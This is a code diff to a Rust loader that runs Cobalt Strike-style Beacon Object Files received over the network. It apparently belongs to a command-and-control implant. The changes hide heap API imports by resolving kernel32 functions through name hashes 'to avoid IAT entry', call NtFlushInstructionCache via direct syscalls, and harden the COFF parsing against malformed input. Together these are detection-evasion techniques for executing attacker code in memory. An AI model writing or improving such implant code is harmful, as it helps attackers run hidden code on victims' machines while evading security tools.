@@ -316,10 +316,24 @@ unsafe extern "C" fn beacon_data_extract(parser: *mut BeaconDataParser, size: *m
 /// `BeaconPrintf(type, fmt, ...)` — formatted output to the callback buffer.
 /// We ignore `type` (CS uses it to distinguish output types) and just format.
 ///
-/// NOTE: Rust cannot safely access C variadic arguments (VaList is
-/// platform-fragile).  We emit the format string literally without
-/// %-expansion.  BOFs that need formatted output should use
-/// BeaconOutput or BeaconOutputPrintf instead.
+/// # Known Limitation — Variadic Arguments (P2-30)
+///
+/// Rust cannot safely access C variadic arguments.  `VaList` is
+/// platform-fragile and unstable.  This function emits the format string
+/// *literally* without %-expansion, so BOFs using `BeaconPrintf` with
+/// format specifiers like `%d`, `%s`, `%x`, `%p` will produce garbled or
+/// incomplete output.
+///
+/// **Workarounds**:
+/// - BOFs should prefer `BeaconOutput` with a pre-formatted buffer.
+/// - Alternatively, use `BeaconOutputPrintf` (non-variadic wrapper).
+/// - A future improvement could implement minimal `%d`/`%s`/`%x`/`%p`
+///   expansion by parsing the format string and extracting arguments from
+///   the stack / registers (x64 calling convention: first 4 args in
+///   RCX, RDX, R8, R9; remainder on stack).  This is non-trivial and
+///   platform-specific.
+/// - The `cvt` crate provides C variadic argument access but adds a
+///   dependency and has its own platform limitations.
 unsafe extern "C" fn beacon_printf(_typ: i32, fmt: *const i8, ...) -> i32 {
     if fmt.is_null() {
         return 0;
@@ -443,9 +457,11 @@ unsafe extern "C" fn crt_free(ptr: *mut c_void) {
     if ptr.is_null() {
         return;
     }
-    // We don't track the layout, so use libc::free via HeapFree.
-    let heap = GetProcessHeap();
-    HeapFree(heap, 0, ptr);
+    // Use runtime-resolved HeapFree to avoid IAT entry.
+    let heap = get_process_heap();
+    if let Some(heap_free) = resolve_heap_fn::<FnHeapFree>(b"HeapFree\0") {
+        heap_free(heap, 0, ptr);
+    }
 }
 
 unsafe extern "C" fn crt_calloc(count: usize, size: usize) -> *mut c_void {
@@ -469,9 +485,13 @@ unsafe extern "C" fn crt_realloc(ptr: *mut c_void, size: usize) -> *mut c_void {
     if ptr.is_null() {
         return std::alloc::alloc(new_layout) as *mut c_void;
     }
-    // Without knowing the old size, use HeapReAlloc.
-    let heap = GetProcessHeap();
-    HeapReAlloc(heap, 0, ptr, size) as *mut c_void
+    // Without knowing the old size, use runtime-resolved HeapReAlloc.
+    let heap = get_process_heap();
+    if let Some(heap_realloc) = resolve_heap_fn::<FnHeapReAlloc>(b"HeapReAlloc\0") {
+        heap_realloc(heap, 0, ptr, size) as *mut c_void
+    } else {
+        std::ptr::null_mut()
+    }
 }
 
 unsafe extern "C" fn crt_memset(dst: *mut c_void, val: i32, count: usize) -> *mut c_void {
@@ -532,13 +552,30 @@ unsafe extern "C" fn crt_snprintf(dst: *mut i8, count: usize, fmt: *const i8, ..
     copy_len as i32
 }
 
-// ── Heap API imports ─────────────────────────────────────────────────────────
+// ── Heap API — runtime-resolved via pe_resolve (no IAT entries) ────────────
 
-extern "system" {
-    fn GetProcessHeap() -> *mut c_void;
-    fn HeapAlloc(heap: *mut c_void, flags: u32, size: usize) -> *mut c_void;
-    fn HeapFree(heap: *mut c_void, flags: u32, ptr: *mut c_void) -> i32;
-    fn HeapReAlloc(heap: *mut c_void, flags: u32, ptr: *mut c_void, size: usize) -> *mut c_void;
+type FnGetProcessHeap = unsafe extern "system" fn() -> *mut c_void;
+type FnHeapAlloc = unsafe extern "system" fn(*mut c_void, u32, usize) -> *mut c_void;
+type FnHeapFree = unsafe extern "system" fn(*mut c_void, u32, *mut c_void) -> i32;
+type FnHeapReAlloc = unsafe extern "system" fn(*mut c_void, u32, *mut c_void, usize) -> *mut c_void;
+
+/// Resolve a kernel32 heap function by name hash at runtime.
+#[cfg(windows)]
+unsafe fn resolve_heap_fn<T>(name: &[u8]) -> Option<T>
+where
+    T: Copy,
+{
+    let k32 = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)?;
+    let addr = pe_resolve::get_proc_address_by_hash(k32, pe_resolve::hash_str(name))?;
+    Some(std::mem::transmute::<usize, T>(addr))
+}
+
+/// Get the current process heap via runtime-resolved GetProcessHeap.
+#[cfg(windows)]
+unsafe fn get_process_heap() -> *mut c_void {
+    let f: FnGetProcessHeap = resolve_heap_fn(b"GetProcessHeap\0")
+        .expect("coff_loader: GetProcessHeap resolution failed");
+    f()
 }
 
 // ── Symbol table ─────────────────────────────────────────────────────────────
@@ -777,7 +814,9 @@ pub unsafe fn execute_bof(
     if coff_bytes.len() < std::mem::size_of::<CoffHeader>() {
         return Err("COFF data too small for header".to_string());
     }
-    let header = &*(coff_bytes.as_ptr() as *const CoffHeader);
+    // P2-28: Use read_unaligned — COFF bytes from the network may not be
+    // aligned to the natural alignment of CoffHeader.
+    let header = std::ptr::read_unaligned(coff_bytes.as_ptr() as *const CoffHeader);
 
     // Validate machine type.
     match header.machine {
@@ -800,29 +839,41 @@ pub unsafe fn execute_bof(
 
     // ── Parse section headers ───────────────────────────────────────────
     let section_offset = std::mem::size_of::<CoffHeader>() + header.size_of_optional_header as usize;
-    let sections: Vec<CoffSection> = (0..header.number_of_sections)
-        .map(|i| {
+    let sections: Vec<CoffSection> = {
+        let mut secs = Vec::with_capacity(header.number_of_sections as usize);
+        for i in 0..header.number_of_sections {
             let off = section_offset + i as usize * std::mem::size_of::<CoffSection>();
             if off + std::mem::size_of::<CoffSection>() > coff_bytes.len() {
-                panic!("COFF section header out of bounds");
+                // P2-29: Return an error instead of panicking on malformed input.
+                return Err("COFF section header out of bounds".to_string());
             }
-            *(coff_bytes.as_ptr().add(off) as *const CoffSection)
-        })
-        .collect();
+            // P2-28: read_unaligned — section data may not be naturally aligned.
+            secs.push(std::ptr::read_unaligned(
+                coff_bytes.as_ptr().add(off) as *const CoffSection,
+            ));
+        }
+        secs
+    };
 
     // ── Parse symbol table ──────────────────────────────────────────────
     let sym_offset = header.pointer_to_symbol_table as usize;
     let sym_count = header.number_of_symbols as usize;
     let sym_size = std::mem::size_of::<CoffSymbol>();
-    let symbols: Vec<CoffSymbol> = (0..sym_count)
-        .map(|i| {
+    let symbols: Vec<CoffSymbol> = {
+        let mut syms = Vec::with_capacity(sym_count);
+        for i in 0..sym_count {
             let off = sym_offset + i * sym_size;
             if off + sym_size > coff_bytes.len() {
-                panic!("COFF symbol table out of bounds");
+                // P2-29: Return an error instead of panicking on malformed input.
+                return Err("COFF symbol table out of bounds".to_string());
             }
-            *(coff_bytes.as_ptr().add(off) as *const CoffSymbol)
-        })
-        .collect();
+            // P2-28: read_unaligned — symbol data may not be naturally aligned.
+            syms.push(std::ptr::read_unaligned(
+                coff_bytes.as_ptr().add(off) as *const CoffSymbol,
+            ));
+        }
+        syms
+    };
 
     // ── Parse string table ──────────────────────────────────────────────
     let str_table_offset = sym_offset + sym_count * sym_size;
@@ -1044,6 +1095,34 @@ pub unsafe fn execute_bof(
             prot as u64,                               // NewProtect
             &mut old_prot as *mut u32 as u64,         // OldProtect
         );
+    }
+
+    // P3-15: Flush instruction cache after section protection changes.
+    //
+    // The COFF sections were written while mapped RW and are now being
+    // flipped to RX.  On x86/x64 the I-cache is coherent with data
+    // writes, so this is a no-op.  On ARM64 (or virtualized environments
+    // with split TLBs), stale cached instructions may be executed without
+    // this flush.  Non-fatal: log and continue regardless.
+    {
+        let flush_status = syscall!(
+            "NtFlushInstructionCache",
+            (-1isize) as u64,             // NtCurrentProcess()
+            base as usize as u64,         // COFF base address
+            total_size as u64,            // total mapped size
+        );
+        match flush_status {
+            Ok(s) if s < 0 => {
+                log::warn!(
+                    "coff_loader: NtFlushInstructionCache returned 0x{:08X} (non-fatal on x64)",
+                    s as u32
+                );
+            }
+            Err(_) => {
+                log::debug!("coff_loader: NtFlushInstructionCache syscall not available");
+            }
+            _ => {} // success (status >= 0)
+        }
     }
 
     // ── Find "go" entry point ───────────────────────────────────────────
